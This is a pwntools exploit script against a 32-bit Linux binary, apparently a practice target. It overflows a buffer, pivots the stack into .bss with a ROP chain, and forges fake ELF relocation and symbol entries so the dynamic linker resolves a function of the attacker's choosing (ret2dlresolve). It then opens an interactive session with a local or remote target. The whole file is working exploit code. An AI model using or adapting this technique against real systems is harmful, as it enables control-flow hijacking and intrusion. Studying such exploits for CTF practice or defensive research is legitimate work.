from pwn import *
context(os="linux", arch="i386")

def debug_on():
	if (args.DEBUG):
		context.log_level = "debug"

g_fname = "./main_partial_relro_32"
g_elf = ELF(g_fname)

if (args.LOCAL):
	g_io = process(g_fname)
else:
	g_io = remote(args.HOST, int(args.PORT))

def getpid():
	if (args.LOCAL):
		log.info("pid:%d\n", g_io.proc.pid)
		pause()

def pwn():
	padding_len = 0x70
	bss_addr = g_elf.bss()
	new_stk = bss_addr + 0x800 + (0x80487d8-0x80487a8) // 2 * 0x10 # *0x10 means * symobj_sz

	rop = ROP(g_elf)
	rop.raw('a' * padding_len)
	rop.read(0, new_stk, 0x200)
	rop.migrate(new_stk)
	g_io.send(rop.chain())
	
	versym_shaddr = g_elf.get_section_by_name(".gnu.version")["sh_addr"]
	dynstr_shaddr = g_elf.get_section_by_name(".dynstr")["sh_addr"]
	dynsym_shaddr = g_elf.get_section_by_name(".dynsym")["sh_addr"]
	relplt_shaddr = g_elf.get_section_by_name(".rel.plt")["sh_addr"]
	plt0_addr = g_elf.get_section_by_name(".plt")["sh_addr"]


	# forge fake Elf32_Sym object
	fake_dynsym_addr = new_stk + 32
	# sizeof(Elf32_Sym) == 0x10, and dynsym_shaddr may not be 0x10-aligned.
	fake_dynsym_align = 0x10 - ((fake_dynsym_addr - dynsym_shaddr) & 0xf)
	fake_dynsym_addr += fake_dynsym_align
	fake_symidx = (fake_dynsym_addr - dynsym_shaddr) // 0x10
	fake_symstr_addr = fake_dynsym_addr + 0x10 + 8
	fake_symstr_offset = fake_symstr_addr - dynstr_shaddr
	fake_symobj = flat(
		fake_symstr_offset, # st_name
		0, 0, # sh_value, sh_size
		0x12  # st_info:8, st_other:8, st_shndx:16
	)
	log.info("ndx_addr = %#x\n", versym_shaddr + fake_symidx * 2)

	# forge fake Elf32_Rel object.
	fake_reloc_addr = new_stk + 24
	fake_reloc_offset = fake_reloc_addr - relplt_shaddr
	r_offset = g_elf.got["write"] # where to applicate relocation
	r_info = (fake_symidx << 8) | 0x7
	fake_reloc = flat(r_offset, r_info)

	sh = "/bin/sh\0"
	binsh_addr = fake_dynsym_addr + 0x10

	# construct rop chain
	rop = ROP(g_elf)
	rop.raw(plt0_addr)
	rop.raw(fake_reloc_offset)
	rop.raw(0xdeadbeef) # ret address from write
	# write(1, binsh_addr, len(sh))
	rop.raw(flat(1, binsh_addr, len(sh)))
	
	rop.raw(fake_reloc)
	rop.raw('a' * fake_dynsym_align)
	rop.raw(fake_symobj)
	rop.raw("/bin/sh\0")
	rop.raw("write\0")

	g_io.send(rop.chain())

	
if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()
